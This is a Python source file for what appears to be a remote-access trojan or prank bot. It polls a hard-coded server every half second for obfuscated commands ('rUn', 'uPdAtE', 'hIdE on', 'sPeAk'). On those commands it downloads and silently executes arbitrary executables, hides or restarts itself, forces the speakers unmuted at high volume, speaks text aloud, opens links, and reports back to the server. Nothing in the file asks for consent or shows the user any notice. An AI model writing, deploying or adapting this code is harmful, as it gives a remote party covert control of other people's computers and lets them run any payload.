import requests as rq
from time import sleep
from threading import Thread
from webbrowser import open as wbopen
import pygame
import os
import pyttsx3
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
from shutil import rmtree
url = "https://ms32-sha2.onrender.com/"
terminate = False
user = "93"
#compile left
try:
    pygame.mixer.init()
except:
    pass
if not os.path.exists("effects"):
    os.mkdir("effects")
if not os.path.exists("assets"):
    os.mkdir("assets")

def hit(url:str,data=None):
    try:
        if not terminate:
            if data:
                return rq.post(url,json=data)
            return rq.get(url,stream=True)
    except:
        return "none"

def log(statement,state="SUCESS"):
    try:
        statement = f"{state}   {statement}"
        hit(url+"output",data={"user":user,"err":statement})
        print("done")
    except:
        print("abhigyan")

def say(txt):
    try:
        engine = pyttsx3.init()
        engine.setProperty("rate",engine.getProperty('rate')-40)
        engine.say(txt)
        log(f"Played {txt}")
        engine.runAndWait()
    except Exception as e:
        log(f"pyttsx3 thread error:\t{e}",state="WARN")

def playfunc(fp):
    try:
        if not os.path.exists(os.path.join("effects",fp)):
            audi = hit(url+f"static/sounds/{fp}")
            try:
                kp = type(audi.content.decode("utf-8"))
                log(f"Likely error. recieved content for {fp} is {kp}")
            except Exception as e:
                log(f"DOwnloaded {fp}")
            with open(os.path.join("effects",fp), "xb") as file:
                downloaded_size = 0
                for chunk in audi.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        # try:                
        CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        
        if volume.GetMute():
            volume.SetMute(0, None)
        log("Unmuted")
        vmin, vmax, _ = volume.GetVolumeRange()
        target = vmin + (95 / 100.0) * (vmax - vmin)
        target = max(min(target, vmax), vmin)
        volume.SetMasterVolumeLevel(target, None)
        # except:
        #     pass
        CoUninitialize()
        pygame.mixer.music.load(f"effects/{fp}")
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            continue               
        log(f"Played {fp}")
    except Exception as e:
        log(f"Audio thread error: \t{e}",state="WARN")
def update():
    try:
        global terminate
        exe = hit(url+"static/updates/ms32-1.exe")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for ms32-1.exe is {kp}")
        except Exception as e:
            log(f"DOwnloaded ms32-1.exe")
        total_size = int(exe.headers.get('content-length', 0))
        with open("ms32-1.exe", "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        exe = hit(url+"static/updates/updater.exe")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for updater.exe is {kp}")
        except Exception as e:
            log(f"DOwnloaded updater.exe")
        with open("updater.exe", "wb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        os.startfile("updater.exe")
        log("Updating ms32.exe")
        terminate=True
        return
    except Exception as e:
        log(f"Updating thread error: \t{e}",state="WARN")


def hide(state):
    try:
        if state:
            if not os.path.exists("hide.exe"):
                exe = hit(url+"static/updates/hide.exe")
                try:
                    kp = type(exe.content.decode("utf-8"))
                    log(f"Likely error. recieved content for hide.exe is {kp}")
                except Exception as e:
                    log(f"DOwnloaded hide.exe")
                with open("hide.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            os.startfile("hide.exe")
        else:
            if not os.path.exists("show.exe"):
                exe = hit(url+"static/updates/show.exe")
                try:
                    kp = type(exe.content.decode("utf-8"))
                    log(f"Likely error. recieved content for show.exe is {kp}")
                except Exception as e:
                    log(f"DOwnloaded show.exe")
                with open("show.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            os.startfile("show.exe")
    except Exception as e:
        log(f"hide/show thread error occured:\t{e}",state="WARN")

def restart():
    try:
        global terminate
        if not os.path.exists("restart.exe"):
            exe = hit(url+"static/updates/restart.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for restart.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded restart.exe")
            with open("restart.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk) 
        os.startfile("restart.exe")
        log("Restarting...")
        terminate = True
    
    except Exception as e:
        log(f"Restart occured:\t{e}",state="WARN")

def run(name):
    try:
        if os.path.exists(name):
            os.remove(name)
        exe = hit(url+f"static/apps/{name}")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for {name} is {kp}")
        except Exception as e:
            log(f"DOwnloaded {name}")
        with open(name, "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        os.startfile(name)
    
    except Exception as e:
        log(f"Run thread error occured:\t{e}",state="WARN")

def display(fp:str):
    try:
        asset = hit(url+f"static/images/{fp}")
        try:
            kp = type(asset.content.decode("utf-8"))
            log(f"Likely error. recieved content for {fp} is {kp}")
        except Exception as e:
            log(f"DOwnloaded {fp}")
        ext = fp.split(".")[1]
        if os.listdir("assets"):
            rmtree("assets")
            log("removed assets folder")
        os.mkdir("assets")
        with open(f"assets/sample.{ext}", "xb") as file:
            downloaded_size = 0
            for chunk in asset.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        try:
            exe = hit(url+f"static/apps/imshow.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for imshow.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded imshow.exe")
            with open("imshow.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        except FileExistsError:
            exe = hit(url+f"static/apps/imshow.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for imshow.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded imshow.exe")
            with open("imshow.exe", "wb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        os.startfile("imshow.exe")
    except Exception as e:
        print("Error")
        log(f"Display thread error occured:\t{e}",state="WARN")

def main():
    try:
        while not terminate:
            sleep(0.5)
            # cmd = hit(url+"command")
            cmd = hit(url+"command",data={"user":user})
            if type(cmd) != str:
                cmd = cmd.content.decode("utf-8")
            print(cmd)
            if "hIdE on" in cmd:
                hide(True)
            elif "hIdE off" in cmd:
                hide(False)
            elif "rEsTaRt" in cmd:
                restart()
            elif "sPeAk" in cmd:
                txt = cmd.replace("sPeAk","")
                saying = Thread(target=say,args=(txt,))
                saying.start()
            elif "oPeN" in cmd:
                link = cmd.replace("oPeN ","")
                wbopen(link)
            elif "pLaY" in cmd:
                fp = cmd.replace("pLaY ","")
                Thread(target=playfunc,args=(fp,)).start()
            elif "uPdAtE" in cmd:
                update()
            elif "rUn" in cmd:
                app_name = cmd.replace("rUn ","")
                Thread(target=run,args=(app_name,)).start()
            elif "iMaGe" in cmd:
                ifp = cmd.replace("iMaGe ","")
                Thread(target=display,args=(ifp,)).start()
    except Exception as e:
        log(f"Main thread error occured:\t{e}",state="WARN")

main()